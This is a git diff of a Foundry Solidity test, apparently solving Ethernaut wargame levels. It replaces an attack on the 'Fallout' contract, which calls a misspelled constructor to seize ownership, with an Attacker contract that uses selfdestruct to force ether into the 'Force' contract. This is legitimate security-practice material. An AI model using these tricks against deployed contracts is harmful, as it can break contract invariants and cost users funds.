@@ -2,21 +2,20 @@
 pragma solidity ^0.8.13;
 
 import {Test} from "forge-std/Test.sol";
-import {Fallout} from "../src/Fallout.sol";
+import {Force} from "../src/Force.sol";
 
-contract FalloutTest is Test {
-    Fallout target;
+contract ForceTest is Test {
+    Force target;
     address player;
 
     function setUp() public {
-        target = new Fallout();
+        target = new Force();
         player = makeAddr("player");
         vm.deal(player, 1 ether);
     }
 
     function attack() private {
-        // call the "intended-to-be-constructor"
-        target.Fal1out();
+        new Attacker{value: 1}(address(target));
     }
 
     function testAttack() public {
@@ -24,6 +23,12 @@ contract FalloutTest is Test {
         attack();
         vm.stopPrank();
 
-        assertEq(target.owner(), address(player), "owner should be the player");
+        assertGt(address(target).balance, 0, "balance should be non-zero");
+    }
+}
+
+contract Attacker {
+    constructor(address _target) payable {
+        selfdestruct(payable(_target));
     }
 }
